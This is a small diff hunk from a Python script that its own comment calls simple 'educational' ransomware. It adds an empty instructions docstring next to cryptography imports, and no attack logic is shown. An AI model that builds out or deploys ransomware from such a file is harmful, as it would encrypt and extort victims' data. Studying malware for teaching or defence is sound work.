@@ -5,9 +5,17 @@ import base64
 import getpass
 import cryptography
 import argparse     # used for making a CLI menu
-
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+
+'''
+INSTRUCTIONS:
+
+
+
+'''
+
+
 
 # this is a very simple kind of ransomware, meant to demonstrate the basic concepts, NOT for actual real-world usage (for educational purposes only)
 
